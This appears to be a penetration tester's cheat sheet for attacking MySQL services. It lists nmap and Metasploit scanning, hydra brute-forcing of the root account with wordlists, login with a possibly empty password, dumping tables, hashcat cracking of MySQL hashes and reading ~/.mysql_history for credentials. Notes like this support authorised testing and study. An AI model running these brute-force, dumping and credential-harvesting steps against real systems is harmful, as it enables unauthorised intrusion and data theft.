# MySQL

```
nmap -Pn -sV -sC -p3306 <ip>

searchsploit MySQL <version>

use auxiliary/scanner/mysql/mysql_version
```

```
use auxiliary/scanner/mysql/mysql_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set VERBOSE false

# Leave USERNAME as root - most important account.
# root password could be NULL.
```

```
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> mysql

# hydra does not test NULL passwords?
```

```
[ERROR] Host '<hostname>' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'

# Brute-forcing can result in IP getting blocked.
```

```
mysql -u root -p -h <ip>

# Press Enter if NULL password.
```

```
show databases;
use <database>;
select * from <table>;
```

```
hashcat -m300 -a0 hashes.txt /usr/share/wordlists/rockyou.txt

# -m300 for MySQL4.1/MySQL5.
```

```
cat ~/.mysql_history
```

## Others
